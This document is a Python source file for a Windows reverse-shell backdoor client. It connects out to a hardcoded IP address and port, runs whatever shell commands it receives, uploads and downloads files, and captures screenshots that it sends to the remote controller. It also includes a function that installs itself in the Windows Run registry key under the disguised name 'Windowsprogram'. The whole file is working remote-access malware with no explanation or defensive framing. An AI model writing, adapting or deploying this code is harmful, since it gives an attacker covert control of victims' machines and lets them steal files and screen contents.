import os
import socket
import json
import subprocess
import pyautogui
import winreg as reg


def reliable_receive():
    data = ''
    while True:
        try:
            data = data + s.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def reliable_send(data):
    jsondata = json.dumps(data)
    s.send(jsondata.encode())

def upload_file(file_name):
    f = open(file_name, 'rb')
    s.send(f.read())
    f.close()

def download_file(file_name):
    f = open(file_name, 'wb')
    s.settimeout(1)
    chunk = s.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = s.recv(1024)
        except socket.timeout as e:
            break
    s.settimeout(None)
    f.close()

def persistance(filelocation):
    # key="HKEY_CURRENT_USER"
    run = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
    reg_modify = reg.OpenKey(reg.HKEY_CURRENT_USER, run, 0, reg.KEY_ALL_ACCESS)
    reg.SetValueEx(reg_modify, "Windowsprogram", 0, reg.REG_SZ, filelocation)
    reg.CloseKey(reg_modify)#Closing the key

#SHELL function
def shell():
    while True:
        command = reliable_receive()
        if command == 'quit' or command == 'exit':
            s.close()
            break

        elif command == '-Ss':
            im2 = pyautogui.screenshot('screenshot.png')
            upload_file('screenshot.png')
            execute = subprocess.Popen('del screenshot.png', shell=True, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)

        elif command == 'help':
            pass

        elif command == 'clear':
            pass

        elif command[:3] == 'cd ':
            if os.path.exists(command[3:]):
                os.chdir(command[3:])
                reliable_send(str(os.getcwd()))
            else:
                reliable_send(False)

        elif command == 'cd':
            if os.sys.platform.startswith('win'):
                path = str(os.sys.path[0])
                reliable_send(path)

            elif os.sys.platform.startswith('linux'):
                os.chdir('/home/kali')
                reliable_send(str(os.getcwd()))

        elif command.startswith('-U'):
            download_file(command[3:])
        
        elif command.startswith('-D'):
            upload_file(command[3:])
        else:
            execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = execute.stdout.read() + execute.stderr.read()
            result = result.decode()
            reliable_send(result)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
msg = "Hello!!"
IP_ADDRESS = '' #Change your IP ADDRESS here
s.connect(('192.168.0.109', 9797)) 
shell()
